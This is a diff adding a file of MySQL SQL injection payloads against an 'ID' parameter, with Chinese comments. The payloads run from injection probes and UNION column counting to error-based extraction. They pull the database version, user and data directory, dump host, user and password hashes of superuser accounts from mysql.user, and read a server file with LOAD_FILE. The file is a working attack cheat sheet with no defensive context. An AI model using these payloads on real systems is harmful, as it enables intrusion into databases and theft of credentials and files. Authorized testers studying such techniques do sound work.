@@ -1,0 +1,28 @@
+ID:1
+ID:1'
+ID:1 or 1=1 --
+ID:1 order by 1 --
+ID:1 union select 1,
+ID:1 union select 1, --
+ID:1 union select 1 --
+ID:1 union select 1,2 --
+ID:1 union select 1,2,3 --
+ID:1 union select 1,2,3,4 --
+ID:'' UNION select 1,2,version()  --
+ID:'' UNION select 1,2,database()  --
+ID:'' UNION select 1,2,user()  --
+ID:'' UNION select 1,2,@@version  --
+ID:'' UNION SELECT extractvalue(rand(),concat(0x3a,(select version())))  --  //基于错误式查询返回数据库版本
+ID:'' UNION SELECT a() --   //基于错误式查询返回当前数据库
+ID:'' UNION SELECT IF(1=2,'true','false') --
+ID:'' UNION SELECT 1,IF(1=2,'true','false') --
+ID:'' UNION SELECT 1,2,IF(1=2,'true','false') --
+ID:'' UNION SELECT 1,2,1||0 --
+// 信息收集
+ID:'' UNION SELECT 1,2,system_user() --
+ID:'' UNION SELECT 1,2,user from mysql.user --
+ID:'' UNION SELECT 1,2,group_concat(Super_priv) from mysql.user WHERE user='root' --
+ID:'' UNION SELECT 1,2,group_concat(host,user,password) from mysql.user WHERE Super_priv='Y' --
+ID:'' UNION SELECT 1,2,@@datadir --  //数据库路径
+ID:'' UNION SELECT 1,2,LOAD_FILE('D:\phpStudy\WWW\i.php') --  //读取文件
+
